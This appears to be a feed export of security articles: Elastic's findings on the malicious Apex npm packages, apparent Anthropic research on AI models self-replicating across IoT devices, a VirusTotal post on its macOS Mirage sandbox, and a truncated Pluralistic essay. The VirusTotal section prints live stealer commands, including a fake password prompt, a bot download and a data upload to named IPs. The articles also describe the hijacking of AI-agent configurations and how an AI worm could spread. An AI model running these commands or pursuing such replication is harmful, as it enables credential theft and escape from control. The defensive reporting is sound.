A fake Web3 accelerator called Apex has been using malicious npm packages to target cryptocurrency start-ups and founders with what appeared to be free AI credits, coding tools, smart-contract audits, investment access, and invitations to in-person events.

Behind the polished Web3 pitch, the operation delivered malware for macOS and Windows, exposed AI-agent data to attacker-run systems, and provided false security results that could mislead teams into trusting unsafe code.

The campaign used two npm packages, @apexacc/cli and @apexacc/audit, presented as an AI coding agent and a Model Context Protocol (MCP) security-audit tool. Users who ran the packages through npm or npx could trigger a multistage infection chain.

The operation is especially concerning because crypto founders often handle wallet keys, source code, cloud credentials, investor data, and smart-contract material on the same developer systems.

Analysts at Elastic Security Labs identified the malicious @apexacc/cli package after a supply-chain monitor flagged suspicious behavior.

Their investigation linked it to a broader operation posing as the Apex accelerator and later found @apexacc/audit, another malicious package from the same publisher. The packages were malicious when published rather than being legitimate projects that were later compromised.

Fake Web3 Accelerator Uses Malicious npm Packages

Apex presented its main service as “Apex Arena,” a private workspace for Web3 founders. The site claimed more than 200 portfolio projects and more than $124 million raised.

It promoted smart-contract reviews, founder messaging, a directory of vetted talent, investment scoring, free Claude and Gemini credits, and the Apex Copilot coding tool.

The group also used fake reviews and advertised a physical event connected to TOKEN2049 in Singapore, a tactic designed to make the operation look like a real startup programme.

Fake reviews (Source – Elastic)

This mix of AI services, crypto branding, public repositories, and live-event activity shows how modern social-engineering campaigns can move beyond a simple phishing page.

Similar risks were seen in a malicious npm campaign targeting Web3 developers, where poisoned packages sought wallet phrases, API tokens, SSH keys, and cloud credentials.

Apex Copilot largely copied the legitimate open-source Oh My Pi coding agent. Elastic found that 1,351 of 1,363 compared source files matched the original project.

The altered code added a bootstrap component that could receive commands from Apex-controlled infrastructure, change AI service routing, and add an attacker-controlled MCP server to the victim’s configuration.

Malware Delivery on Windows and macOS

The npm package launchers used apex.cjs and audit.cjs to download platform-specific files from GitHub releases. On Windows, the code contacted vrf.apexaccs[.]org and received server-selected commands. It then created PowerShell and VBScript staging files before launching wscript.exe, PowerShell, and later malware stages.

The Windows chain led to a custom information stealer through bludness.exe, install.exe or exegis.exe, and updater_loader.exe. The final payload collected system details, clipboard data, screenshots, browser information, Wi-Fi profile names, files, and data from wallet, VPN, remote-access, messaging, and AI-client applications.

Auth dialog pop-up (Source – Elastic)

It also targeted Chrome, Edge, Firefox, and Yandex browser data, including saved credentials and cookies, before archiving collected material and sending it through Telegram.

On macOS, a Rust helper requested a command from the same verification service. The command fetched a script that delivered CloudSyncD, a backdoor which requested the user’s administrator password through a fake prompt and then collected host information before contacting its command-and-control server.

The CloudSyncD delivery method overlaps with the earlier fake Zoom installer CloudSyncD campaign, which also used a counterfeit installer and password prompt to run a privileged backdoor on macOS devices.

Apex Copilot changed OpenRouter-related environment settings so that model requests were sent to arena.apexaccs[.]org, rather than directly to the expected AI provider endpoint.

Elastic confirmed that prompts, conversation history, code snippets, local tool output, and available tool definitions could be sent to the Apex-controlled service.

The package also wrote an apex-copilot MCP entry into ~/.apex/agent/mcp.json, giving the remote server a lasting connection path across later sessions.

This is important because MCP tools may be allowed to read local files, call APIs, or run actions through AI clients. The danger follows a pattern documented in the first malicious MCP server discovery, in which a trojanized npm tool silently copied emails handled by an AI agent.

Error from executing first-stage loader (Source – Elastic)

The second package, @apexacc/audit, claimed to offer 18 smart-contract security tools. Elastic found that every tool returned fabricated results rather than performing the stated checks. Some results were hard-coded, some inserted user-provided labels, and others used random or date-based values.

In one test, Apex’s remote scoring tool returned a score of 51/100 for a fictional project despite receiving no code repository, contract address, team data, or other evidence.

Teams should remove the two Apex packages from developer systems, review shell history and endpoint telemetry, and rotate secrets that may have been exposed.

This includes crypto wallet credentials, seed phrases, API keys, cloud tokens, GitHub credentials, browser sessions, SSH keys, and AI-service tokens.

Organisations should also examine AI-agent configuration files for unexpected MCP entries and review outbound connections to the listed domains.

Developers should verify npm publisher identity, repository ownership, release history, and package behavior before installing unfamiliar Web3 or AI tools.

npm lifecycle scripts can run during installation, while npm’s ignore-scripts setting prevents scripts declared in package.json from running; this can provide a safer review step, although explicitly invoked package commands can still execute.

Security teams should also alert on npm-launched PowerShell, VBScript, curl, or shell activity, especially when it creates files in temporary folders or downloads executable content.

items.title: Anthropic Warns AI Models Could Soon Self-Replicate on Smart TVs and IoT Devices Without a Data Center
items.summary: Anthropic warns that small AI models may be months away from self-replicating across poorly secured smart TVs and other internet-connected devices. Its research suggests future AI worms could run on consumer hardware rather than depend on a data center, making them harder to shut down through a single central service. According to research published on October 12 by William Zhou and Daniel Freeman, AI agents may be able to install and run models on unfamiliar machines. Researchers stressed that they have not demonstrated a complete rogue replicator. Their findings show progress toward that threat, not an active AI malware outbreak. Anthropic Warns AI Could Self-Replicate Across IoT Devices Researchers ran Gemma4-26B-A4B across 15 off-brand Android TV boxes costing about $55 each. Every box had 4GB of RAM and stored part of the model. Together, the devices achieved 0.39 tokens per second, showing that cheap hardware can support a large model, although very slowly. This approach uses distributed inference, where several machines share the work of running an AI model. Instead of fitting everything into one device, researchers split its layers across the boxes. A future worm could carry model weights, the files containing its learned values, onto compromised devices and use their combined resources. The proposed replication chain involves finding targets, gaining access, setting up inference, and spreading from newly reached hosts. Anthropic focused mainly on inference setup, which requires choosing suitable software, fixing package issues, and handling different operating systems. A nine-billion-parameter model successfully established inference on eight of nine hardware types tested. AI Exploitation Workflow Overview (Image Source: Anthropic) In a separate experiment, researchers used eight Google Cloud machines running Android emulators inside an isolated network. Their Android Debug Bridge ports required no authentication. GLM-5.2 reached all eight machines in four of five trials and seven machines in the remaining trial while establishing Llama3.1-8B inference. However, the agent’s own model ran on a separate inference server. Researchers spawned new agent copies after checking each successful setup. This was therefore a simplified test of replication skills, not proof that GLM-5.2 could independently live and reproduce on TV boxes. The easy access path also limits real-world conclusions. Network Node Replication Graph (Image Source: Anthropic) Anthropic estimates smaller models could reach the required skill level by late 2026 if past improvement rates continue. That forecast uses a general AI capability measure rather than a direct replication measure. Hardware limits would still slow spread, with estimated Qwen3.5-9B inference setup taking roughly 28 to 51 hours. Small Model Capability Timeline (Image Source: Anthropic) Existing infections show why this matters. The Kimwolf botnet compromised more than two million devices , including many Android TV boxes. Unlike fixed malware, future AI worms might adjust their setup methods for unfamiliar systems and pass useful troubleshooting notes to later copies. Defenders should watch for large model downloads, unusual traffic between devices, network scanning, and unexpected outbound connections. The Kimwolf v7 report also recommends disabling exposed ADB access and separating TV boxes from business networks. items.title: Introducing macOS Mirage: Next-Generation Apple Silicon Dynamic Analysis and Sigma Detections
items.summary: In November 2015, we released our first in-house macOS sandbox, Box of Apples , followed by an update in March 2018 that introduced HTML behavior reports, desktop screenshots, and process trees. Over the past decade, the macOS ecosystem and the threat landscape targeting it have changed dramatically. Apple transitioned its hardware architecture from Intel ( x86_64 ) to Apple Silicon ( ARM64 ), hardened its operating system security model, and deprecated legacy dynamic tracing mechanisms. At the same time, macOS threat actors have shifted toward native ARM64 binaries, multi-stage social engineering installers, credential-harvesting AppleScripts, and evasive infostealers. Today, we are excited to introduce macOS Mirage , our brand-new, ground-up dynamic analysis sandbox built natively for Apple Silicon and macOS 26 . macOS Mirage replaces Box of Apples as part of the VirusTotal Multi-Sandbox project, delivering high-fidelity behavioral telemetry, automated Sigma behavioral detections mapped to MITRE ATT&CK , and—exclusively within our Private Scanning product offering—full Interactive Live Analysis . Why We Built macOS Mirage: Beyond Box of Apples Box of Apples was designed for an era of Intel-based Macs and relied on dtrace scripts to monitor system calls. As macOS evolved, two structural shifts required a completely new approach: Native Apple Silicon (ARM64) Execution: Modern macOS applications and malware families are compiled natively for Apple Silicon or distributed as Universal Mach-O binaries. Running modern samples on legacy Intel hardware either fails outright or misses architecture-specific execution paths. macOS Mirage runs natively on bare-metal Apple Silicon hardware with Apple's native virtualization stack and macOS 26 , ensuring authentic execution fidelity. Modern Kernel-Backed Behavioral Telemetry: In modern macOS releases, System Integrity Protection (SIP) restricts legacy dtrace hooks, and high syscall volumes could cause event drops. macOS Mirage uses modern, kernel-supported macOS security instrumentation to capture process creation, command-line arguments, file system modifications, persistence installation, and access to sensitive credential stores without losing events. Capability Box of Apples (2015 / 2018) macOS Mirage (2026) Hardware Architecture Intel ( x86_64 ) Native Apple Silicon ( ARM64 ) Operating System OS X 10.11 El Capitan / 10.13 High Sierra Modern macOS (including macOS 26 ) Supported Payloads Intel Mach-O bundles and basic installers ARM64 & Universal Mach-O, .dmg , .pkg , .app , .sh , .py , PDFs Behavioral Telemetry Legacy dtrace syscall tracing Modern kernel-supported security telemetry & accurate process trees Behavioral Detections Basic behavior tags Sigma behavioral rules , MITRE ATT&CK mapping, and YARA scanning Dropped File Analysis Basic file list Automated extraction and recursive multi-engine scanning of dropped payloads Network Capabilities Basic NAT egress Multi-mode networking (Internet, Simulated INetSim, HTTPS MITM, Tor, VPN) (Private Scanning exclusive) Interactive Control Automated execution only Live Mouse, Keyboard & Clipboard Control (Private Scanning exclusive) Rich GUI Execution and Persistence Tracking Many macOS samples package their payloads inside disk images ( .dmg ) or application bundles ( .app ) that initialize graphical windows, register background services, or trigger system notifications during execution. macOS Mirage provides full graphics acceleration and desktop monitoring, capturing both visual screenshots and underlying system modifications in real time. Figure 1: Dynamic detonation of a macOS application in macOS Mirage, capturing both the application GUI and a macOS system notification alerting to a newly registered persistent background Login Item. Figure 2: Full window management, 3D rendering, and Dock process tracking inside macOS Mirage. In addition to capturing screenshots to show what a user would see on screen, macOS Mirage automatically monitors security-sensitive locations across the operating system, including: Persistence Mechanisms: LaunchAgents , LaunchDaemons , Login Items, and cron jobs. Shell & Environment Profiles: Modifications to .zshrc , .bashrc , .zshenv , and /etc/profile . Credential & Privacy Stores: Unauthorized access to Keychain databases ( login.keychain-db ), browser cookie and credential stores, SSH keys, and the Transparency, Consent, and Control ( TCC.db ) database. System & Network Configuration: Changes to /etc/hosts , /etc/resolv.conf , and /private/etc/sudoers . New Behavioral Detections with Sigma Rules: Catching a macOS Info-Stealer in Action To help analysts quickly identify malicious behavior without sifting through thousands of raw file and process events, macOS Mirage evaluates runtime telemetry against a curated library of macOS Sigma rules and maps every detection directly to MITRE ATT&CK techniques. Let's look at a real-world example of a macOS info-stealer and credential-phishing sample analyzed by macOS Mirage on VirusTotal: be77bca22f078d57058535ddcf26a39a752a8df030392cb45ba6a60e06651878 When executed inside macOS Mirage, the binary ( unix51436504 ) performs a multi-stage credential theft and persistence chain: AppleScript Password Phishing: The malware invokes /usr/bin/osascript to display a deceptive system prompt titled "Password Request" asking the user: "Please enter device password to continue." Local Credential Validation & LaunchDaemon Persistence: It validates the harvested password against local Directory Services ( dscl . authonly ) and invokes sudo -S to copy /tmp/daemonplist to /Library/LaunchDaemons/com.somedaemon.plist . Keychain, Browser & Notes Harvesting: The sample opens the user's Keychain ( /Users/admin/Library/Keychains/login.keychain-db ), Safari cookies ( Cookies.binarycookies ), Apple Notes database ( NoteStore.sqlite ), SSH keys ( authorized_keys , known_hosts ), and .zsh_history , staging the stolen files under /tmp/lksopo while continuously polling the clipboard via pbpaste . Secondary Payload Download, Exfiltration & Cleanup: Using ditto , the malware compresses the staging directory into /tmp/lksopo.zip , exfiltrates the archive via an HTTP POST request ( curl -X POST ), downloads a secondary bot payload ( curl -o /tmp/binaryexe ), and deletes the staging directory ( rm -rf /tmp/lksopo ) to cover its tracks. Figure 3: macOS Mirage screenshot capturing the deceptive AppleScript "Password Request" phishing dialog displayed by sample be77bca22f078d57058535ddcf26a39a752a8df030392cb45ba6a60e06651878 . From this single detonation, macOS Mirage automatically generates a high-confidence malicious verdict ( macos_osascript_credential_phishing ) and triggers 7 distinct Sigma rules spanning the entire attack lifecycle: Sigma Rule Name Severity MITRE ATT&CK Matched Behavioral Telemetry macos_osascript_credential_phishing High T1059.002 , T1056.002 Execution of /usr/bin/osascript displaying fake password prompt: osascript -e set passwen to display dialog "Please enter device password to continue." default answer "" with icon caution macos_sensitive_credential_store_access High T1555.001 , T1555.003 , T1005 Unauthorized access by ./unix51436504 to /Users/admin/Library/Keychains/login.keychain-db and Safari Cookies.binarycookies macos_esf_sensitive_file_access High T1555.001 , T1555.003 , T1005 Access to /private/etc/sudoers during privileged persistence installation: sudo -S cp /tmp/daemonplist /Library/LaunchDaemons/com.somedaemon.plist macos_esf_suspicious_curl_download Medium T1105 , T1071.001 Downloading secondary stage payload via curl -o /tmp/binaryexe http://193.178.159.129/web/bot macos_network_upload_activity Medium T1041 , T1567 Exfiltrating compressed credential archive via curl -X POST -H buildid: ... --data-binary @/tmp/lksopo.zip http://109.238.87.111/log macos_data_destruction_tools Medium T1485 , T1070.004 Anti-forensic removal of staging directory via rm -rf /tmp/lksopo macos_http_tools_with_protocol_indicators Low T1071.001 , T1105 Automated curl command-line execution with explicit http:// C2 protocol indicators Hunting Related Threats with VirusTotal Intelligence Pivots At the time of analysis, sample be77bca22f078d57058535ddcf26a39a752a8df030392cb45ba6a60e06651878 was detected by only 6 out of 76 static antivirus engines . Moreover, during execution inside macOS Mirage, the first-stage dropper downloaded and executed a 12.9 MB universal Mach-O second-stage bot ( f7dcdc4167ec267aef007f9d5f98e9e0314185e5355effd3e304b6fa686ea84c ) alongside a LaunchDaemon persistence property list ( d7dd630f67e03d2945185838dca887211ea3693c91fc0bd0d2e257948bb3b678 , 0/75 AV detections ). When that second-stage binary is detonated in isolation, it exits in under a second because it depends on hidden state files ( ~/.bhost , ~/.phost , ~/.username , ~/.pwd ) written to disk by the first-stage dropper. Because macOS Mirage tracks the full multi-stage process tree on macOS 26, analysts can pivot directly on runtime command lines, dropped artifacts, network URI patterns, and Sigma detections across VirusTotal Intelligence to uncover entire clusters of active macOS campaigns. items.summary_html:
In November 2015, we released our first in-house macOS sandbox, Box of Apples, followed by an update in March 2018 that introduced HTML behavior reports, desktop screenshots, and process trees. Over the past decade, the macOS ecosystem and the threat landscape targeting it have changed dramatically. Apple transitioned its hardware architecture from Intel (x86_64) to Apple Silicon (ARM64), hardened its operating system security model, and deprecated legacy dynamic tracing mechanisms. At the same time, macOS threat actors have shifted toward native ARM64 binaries, multi-stage social engineering installers, credential-harvesting AppleScripts, and evasive infostealers.

Today, we are excited to introduce macOS Mirage, our brand-new, ground-up dynamic analysis sandbox built natively for Apple Silicon and macOS 26. macOS Mirage replaces Box of Apples as part of the VirusTotal Multi-Sandbox project, delivering high-fidelity behavioral telemetry, automated Sigma behavioral detections mapped to MITRE ATT&CK, and—exclusively within our Private Scanning product offering—full Interactive Live Analysis.

Why We Built macOS Mirage: Beyond Box of Apples

Box of Apples was designed for an era of Intel-based Macs and relied on dtrace scripts to monitor system calls. As macOS evolved, two structural shifts required a completely new approach:

  1. Native Apple Silicon (ARM64) Execution: Modern macOS applications and malware families are compiled natively for Apple Silicon or distributed as Universal Mach-O binaries. Running modern samples on legacy Intel hardware either fails outright or misses architecture-specific execution paths. macOS Mirage runs natively on bare-metal Apple Silicon hardware with Apple's native virtualization stack and macOS 26, ensuring authentic execution fidelity.
  2. Modern Kernel-Backed Behavioral Telemetry: In modern macOS releases, System Integrity Protection (SIP) restricts legacy dtrace hooks, and high syscall volumes could cause event drops. macOS Mirage uses modern, kernel-supported macOS security instrumentation to capture process creation, command-line arguments, file system modifications, persistence installation, and access to sensitive credential stores without losing events.
Capability Box of Apples (2015 / 2018) macOS Mirage (2026) Hardware Architecture Intel (x86_64) Native Apple Silicon (ARM64) Operating System OS X 10.11 El Capitan / 10.13 High Sierra Modern macOS (including macOS 26) Supported Payloads Intel Mach-O bundles and basic installers ARM64 & Universal Mach-O, .dmg, .pkg, .app, .sh, .py, PDFs Behavioral Telemetry Legacy dtrace syscall tracing Modern kernel-supported security telemetry & accurate process trees Behavioral Detections Basic behavior tags Sigma behavioral rules, MITRE ATT&CK mapping, and YARA scanning Dropped File Analysis Basic file list Automated extraction and recursive multi-engine scanning of dropped payloads Network Capabilities Basic NAT egress Multi-mode networking (Internet, Simulated INetSim, HTTPS MITM, Tor, VPN) (Private Scanning exclusive) Interactive Control Automated execution only Live Mouse, Keyboard & Clipboard Control (Private Scanning exclusive) Rich GUI Execution and Persistence Tracking

Many macOS samples package their payloads inside disk images (.dmg) or application bundles (.app) that initialize graphical windows, register background services, or trigger system notifications during execution. macOS Mirage provides full graphics acceleration and desktop monitoring, capturing both visual screenshots and underlying system modifications in real time.

Figure 1: Dynamic detonation of a macOS application in macOS Mirage, capturing both the application GUI and a macOS system notification alerting to a newly registered persistent background Login Item.
Figure 2: Full window management, 3D rendering, and Dock process tracking inside macOS Mirage.

In addition to capturing screenshots to show what a user would see on screen, macOS Mirage automatically monitors security-sensitive locations across the operating system, including:

  • Persistence Mechanisms: LaunchAgents, LaunchDaemons, Login Items, and cron jobs.
  • Shell & Environment Profiles: Modifications to .zshrc, .bashrc, .zshenv, and /etc/profile.
  • Credential & Privacy Stores: Unauthorized access to Keychain databases (login.keychain-db), browser cookie and credential stores, SSH keys, and the Transparency, Consent, and Control (TCC.db) database.
  • System & Network Configuration: Changes to /etc/hosts, /etc/resolv.conf, and /private/etc/sudoers.
New Behavioral Detections with Sigma Rules: Catching a macOS Info-Stealer in Action

To help analysts quickly identify malicious behavior without sifting through thousands of raw file and process events, macOS Mirage evaluates runtime telemetry against a curated library of macOS Sigma rules and maps every detection directly to MITRE ATT&CK techniques.

Let's look at a real-world example of a macOS info-stealer and credential-phishing sample analyzed by macOS Mirage on VirusTotal: be77bca22f078d57058535ddcf26a39a752a8df030392cb45ba6a60e06651878

When executed inside macOS Mirage, the binary (unix51436504) performs a multi-stage credential theft and persistence chain:

  1. AppleScript Password Phishing: The malware invokes /usr/bin/osascript to display a deceptive system prompt titled "Password Request" asking the user: "Please enter device password to continue."
  2. Local Credential Validation & LaunchDaemon Persistence: It validates the harvested password against local Directory Services (dscl . authonly) and invokes sudo -S to copy /tmp/daemonplist to /Library/LaunchDaemons/com.somedaemon.plist.
  3. Keychain, Browser & Notes Harvesting: The sample opens the user's Keychain (/Users/admin/Library/Keychains/login.keychain-db), Safari cookies (Cookies.binarycookies), Apple Notes database (NoteStore.sqlite), SSH keys (authorized_keys, known_hosts), and .zsh_history, staging the stolen files under /tmp/lksopo while continuously polling the clipboard via pbpaste.
  4. Secondary Payload Download, Exfiltration & Cleanup: Using ditto, the malware compresses the staging directory into /tmp/lksopo.zip, exfiltrates the archive via an HTTP POST request (curl -X POST), downloads a secondary bot payload (curl -o /tmp/binaryexe), and deletes the staging directory (rm -rf /tmp/lksopo) to cover its tracks.
Figure 3: macOS Mirage screenshot capturing the deceptive AppleScript "Password Request" phishing dialog displayed by sample be77bca22f078d57058535ddcf26a39a752a8df030392cb45ba6a60e06651878.

From this single detonation, macOS Mirage automatically generates a high-confidence malicious verdict (macos_osascript_credential_phishing) and triggers 7 distinct Sigma rules spanning the entire attack lifecycle:

Sigma Rule Name Severity MITRE ATT&CK Matched Behavioral Telemetry macos_osascript_credential_phishing High T1059.002, T1056.002 Execution of /usr/bin/osascript displaying fake password prompt: osascript -e set passwen to display dialog "Please enter device password to continue." default answer "" with icon caution macos_sensitive_credential_store_access High T1555.001, T1555.003, T1005 Unauthorized access by ./unix51436504 to /Users/admin/Library/Keychains/login.keychain-db and Safari Cookies.binarycookies macos_esf_sensitive_file_access High T1555.001, T1555.003, T1005 Access to /private/etc/sudoers during privileged persistence installation: sudo -S cp /tmp/daemonplist /Library/LaunchDaemons/com.somedaemon.plist macos_esf_suspicious_curl_download Medium T1105, T1071.001 Downloading secondary stage payload via curl -o /tmp/binaryexe http://193.178.159.129/web/bot macos_network_upload_activity Medium T1041, T1567 Exfiltrating compressed credential archive via curl -X POST -H buildid: ... --data-binary @/tmp/lksopo.zip http://109.238.87.111/log macos_data_destruction_tools Medium T1485, T1070.004 Anti-forensic removal of staging directory via rm -rf /tmp/lksopo macos_http_tools_with_protocol_indicators Low T1071.001, T1105 Automated curl command-line execution with explicit http:// C2 protocol indicators Hunting Related Threats with VirusTotal Intelligence Pivots

At the time of analysis, sample be77bca22f078d57058535ddcf26a39a752a8df030392cb45ba6a60e06651878 was detected by only 6 out of 76 static antivirus engines. Moreover, during execution inside macOS Mirage, the first-stage dropper downloaded and executed a 12.9 MB universal Mach-O second-stage bot (f7dcdc4167ec267aef007f9d5f98e9e0314185e5355effd3e304b6fa686ea84c) alongside a LaunchDaemon persistence property list (d7dd630f67e03d2945185838dca887211ea3693c91fc0bd0d2e257948bb3b678, 0/75 AV detections). When that second-stage binary is detonated in isolation, it exits in under a second because it depends on hidden state files (~/.bhost, ~/.phost, ~/.username, ~/.pwd) written to disk by the first-stage dropper. Because macOS Mirage tracks the full multi-stage process tree on macOS 26, analysts can pivot directly on runtime command lines, dropped artifacts, network URI patterns, and Sigma detections across VirusTotal Intelligence to uncover entire clusters of active macOS campaigns. For a complete reference of supported file and behavior query syntax, see the VirusTotal Search Modifiers Full List.

1. Process & Command-Line Pivots (behaviour_processes)
  • Custom Exfiltration curl Headers: Hunts samples exfiltrating staged archives with custom buildid: and username: HTTP headers across rotating C2 servers: behaviour_processes:"curl -X POST -H buildid:"
  • AppleScript Phishing Dialog Variable: Pinpoints samples spawning osascript with the passwen password dialog variable: behaviour_processes:"set passwen to display dialog"
  • Second-Stage Bot Payload Delivery: Matches command lines downloading the persistent implant from /web/bot: behaviour_processes:"/web/bot"
  • Staging Archive Compression via ditto: Identifies Mach-O stealers compressing harvested credentials in /tmp/ using Apple's ditto utility: behaviour_processes:"ditto -c -k --sequesterRsrc /tmp/" type:macho
2. Dropped File & Hidden State File Pivots (behaviour_files)
  • Hidden Bot C2 Configuration in $HOME: Finds samples writing hidden bot configuration files (~/.bhost, ~/.phost, ~/.botid) into the user's home directory: behaviour_files:".bhost"
  • Hidden Second-Stage Bot Executable: Matches samples dropping the persistent second-stage payload to $HOME/.binaryexe: behaviour_files:".binaryexe"
  • LaunchDaemon Persistence Plist: Uncovers samples installing system-wide persistence at /Library/LaunchDaemons/com.somedaemon.plist: behaviour_files:"/Library/LaunchDaemons/com.somedaemon.plist"
3. C2 & Network Pivots (behaviour_network)
  • Infrastructure-Agnostic Bot Check-In URI: Matches the /api/v1/bot/joinsystem// check-in endpoint across all C2 IP addresses: behaviour_network:"/api/v1/bot/joinsystem"
  • Exfiltration Collector Server: Pivots on samples posting stolen Keychain, Safari cookie, and Notes archives to 109.238.87.111: behaviour_network:109.238.87.111
  • Second-Stage Bot C2 Server: Pivots on samples retrieving /web/bot and polling /api/v1/bot/actions/ on 193.178.159.129: behaviour_network:193.178.159.129
4. macOS Mirage Verdict, Sigma & MITRE ATT&CK Pivots
  • macOS Mirage Credential Phishing Verdict: Surfaces Mach-O stealers convicted by macOS Mirage's macos_osascript_credential_phishing detection across distinct malware builders (commandbuild-* and macos-stealer-v2-*): sandbox_name:"VirusTotal MacOS Mirage" behaviour:"macos_osascript_credential_phishing"
  • macOS Mirage PASSWORD_DIALOG Behavioral Tag: Finds Mach-O binaries displaying deceptive credential prompts during macOS Mirage execution: sandbox_name:"VirusTotal MacOS Mirage" behaviour_tags:PASSWORD_DIALOG type:macho p:5+
  • Sigma Suspicious /tmp/ Execution in macOS Mirage: Hunts samples matching Sigma rule b8017658b8eef8b1293176d76212e600b660d0a36a4f5dc80141324fae360bbf (Potentially Suspicious Execution From Tmp Folder): sandbox_name:"VirusTotal MacOS Mirage" sigma_rule:b8017658b8eef8b1293176d76212e600b660d0a36a4f5dc80141324fae360bbf p:5+
  • MITRE ATT&CK Keychain Credential Access (T1555.001): Identifies Mach-O samples flagged by macOS Mirage for targeting macOS Keychain credentials: sandbox_name:"VirusTotal MacOS Mirage" attack_technique:T1555.001 type:macho p:5+

items.title: Pluralistic: Bundestrojaner (13 Oct 2026)
items.summary: Today's links Bundestrojaner : You can't make people more secure by making them less secure. Hey look at this : Delights to delectate. Object permanence : 9/11 sitcom; Jon Norman v Philcon; Bruce Sterling's post-9/11 geopolitics; Polaroid bankrupt; David Mamet x Shel Silverstein; "Great Big Beautiful Tomorrow"; Canadian government calls abortion doctors "terrorists"; Shanghai Ikea kicks out lonely, loitering seniors; Black Panther self-care. Upcoming appearances : Paris, Vancouver, Victoria, Ottawa, Vienna, Kilkenny, Oxford, Sheffield, Oxford, Montreal. Recent appearances : Where I've been. Latest books : You keep readin' em, I'll keep writin' 'em. Upcoming books : Like I said, I'll keep writin' 'em. Colophon : All the rest. Bundestrojaner ( permalink ) Every morning, I revisit my blog headlines from this date, going back 25 years, 20 years, 15 years, 10 years, 5 years, and one year. I publish the most interesting ones in a section of my newsletter that I call "object permanence," and I think it's the most useful part of my day. "Object permanence," of course, is a reference to the stage in an infant's development when they acquire the ability to connect events in the past to events in the present, which is why it's the point at which babies cease to be amazed by peek-a-boo. I've been blogging for more than a quarter century, and these daily trawls through the things I considered important enough to share are an unexpectedly powerful way to connect the events of the past to the events of the present. Take cybersecurity, subject that is filling today's headlines, primarily due to a spate of poorly understood (and criminally poorly explained) incidents in which AI companies' hacking tools broke into various servers on the internet, sometimes trashing them: https://pluralistic.net/2026/09/12/god-in-the-box/#llms-are-fake In my discussions of this subject, I've been at pains to tease apart two different aspects of these incidents: first, that it's wrong to speak of bots "going rogue" here (they're doing what they're designed to do); but second, that the alarming thing about these incidents is that they illustrate how deeply unserious our approach to information security has been, and remains. This is important context, and context is what gives us the object permanence we need to both understand and address real problems, like the two related facts that a) our IT systems are poorly constructed and indifferently maintained; and b) the people who are supposed to be fixing this keep making it worse. The worst culprits here are governments, though the private sector is also terrible (in truth, our cybersecurity nightmare is something of a private-public partnership from hell). Governments are deeply compromised when it comes to digital security because they have an irreconcilable conflict of interest: on the one hand, they want to defend their countries' administrative systems, firms and households from digital attacks. But on the other hand, they really want to be able to launch attacks on their adversaries, both foreign and domestic. Worse: because governments don't know who those adversaries might be (or might become at some later date), the state security apparatuses of the world's governments keep insisting that all working computer security must be dismantled, so they can spy on all of us in order to figure out whom among us is a Bad Guy, and then "travel back in time" through each newly discovered "bad guy's" communications to identify their confederates and detail their nefarious plots. This is an old, old, old fight. It was arguably the first policy fight of the digital era: the fight over whether we could have working encryption at all . Old hands call this era "the crypto wars" (from when "crypto" meant "cryptography"), when the NSA classed working encryption code as a "munition" and criminalized civilian access to it. That was a very hard-fought fight, and it was won decisively by the Electronic Frontier Foundation and our just-retired executive director Cindy Cohn, who, as a young lawyer, litigated the "Bernstein case" that established that code was a form of expressive speech protected by the First Amendment. If you're interested in learning more about this, you should read Cindy's newly published memoir, Privacy's Defender (all profits go to EFF): https://mitpress.mit.edu/9780262051248/privacys-defender/ Before Cindy came on the scene, the crypto wars were being fought primarily by the "cypherpunks," a motley gang of computer security enthusiasts of many political stripes who were unified by their conviction that the most important aspect of security was defensive . The fact that the NSA wanted to be able to read the private messages and files of their adversaries (the "Four Horsemen of the Infocalypse": terrorists, drug traffickers, child pornographers and organized crime) must not be allowed to trump the fact that any encryption that the NSA could pierce could also be pierced by bad guys: corporate spies, state-sponsored spies, griefers, petty criminals, stalkers, identity thieves and other creeps. This argument was so indisputable, it's a tautology : "You cannot make a computer user more secure by making their computers less secure." We don't know how to make a computer that only "good guys" can break into, but which "bad guys" bounce off of. Either we make computers more secure, or we don't. We didn't. In the decades since the crypto wars, governments have embarked upon an uninterrupted program to weaken the security of our computers, with catastrophic effect. The most spectacular example is unquestionably the spy agencies' doctrine called "NOBUS," which stands for "no one but us"; as in "No one but us is smart enough to find this bug, which means that we can withhold its discovery from the manufacturer, which will allow us to weaponize this bug and use it to attack our enemies. Because no one but us is smart enough to find this bug, none of those enemies will ever discover it, weaponize it, and use it to attack the people who pay our salaries, who expect us to keep them safe." This turns out to be both catastrophically wrong and catastrophically dangerous. A series of leaks of computer vulnerabilities hoarded by both the NSA and CIA under NOBUS confirmed that these bugs were independently rediscovered by criminals and state actors at the rate of about 20% per year. Worse, though, is that these bugs don't need to be independently rediscovered, because the NSA and CIA both leaked them. The highest-profile leak was an NSA-hoarded vulnerability in Windows they codenamed "Eternal Blue." Eternal Blue leaked in 2017, whereupon cybercriminals hybridized it with some otherwise undistinguished ransomware to create Wannacry, a devastating piece of malware that took down hospitals, banks and oil pipelines, as well as the entire city government of Baltimore and the British Library: https://cdn.sanity.io/files/v5dwkion/production/99206a2d1e9f07b35712b78f7d75fbb09560c08d.pdf But NOBUS isn't the only example of spy agencies making our computers less secure in the name of making us more secure. Perhaps the most egregious example of that are the Bundestrojaners, malicious software purchased by the German government, whose customs agents secretly installed it on the computers of unsuspecting people during border inspections. This "lawful interception" software was hugely invasive: it could grab your screen, plunder your hard drive, and install and execute software on your computer, all with the utmost stealth, intended to keep you from knowing it was installed and operating on your computer. But it wasn't merely invasive – it was insecure, so anyone (rival spies, criminals, stalkers) could scan the internet for infected computers and take them over: https://www.ccc.de/en/updates/2011/staatstrojaner You really couldn't ask for a more perfect example of the maxim that you can't make computer users more secure by making their computers less secure. Despite this, governments continue to demand the introduction of grave, universal secure vulnerabilities into our digital lives. Take "chat control," a proposal to force every device manufacturer to install software that continuously scans your devices for child sex abuse material (AKA "child porn"): https://www.eff.org/deeplinks/2026/04/eu-parliament-blocks-mass-scanning-our-chats-whats-next There are plenty of things wrong with this, starting with the fact that it requires your device to secretly grab and transmit sensitive images from your phone, which might include sensitive images of your kids that were requested by their doctors. This isn't a hypothetical: it's something that happened to a dad who subsequently lost his email, his login to every other account, his phone number, all of his files (including his tax records and his business data), and every photo he had ever taken of his family, without appeal, after Google automatically detected a photo he took of his son to send to the family pediatrician. Google also falsely accused this man of sexually abusing his child and sicced the SFPD on him: https://pluralistic.net/2022/08/22/allopathic-risk/#snitches-get-stitches But even if you're not worried about this, you should still have the object permanence to recall the lessons of NOBUS and the Bundestrojaner. We can't make computer users more secure by making their computers less secure, and it's hard to imagine something more insecure than a computer that you entrust with every sensitive detail of your life that is designed to run computer code in secret that you can neither inspect 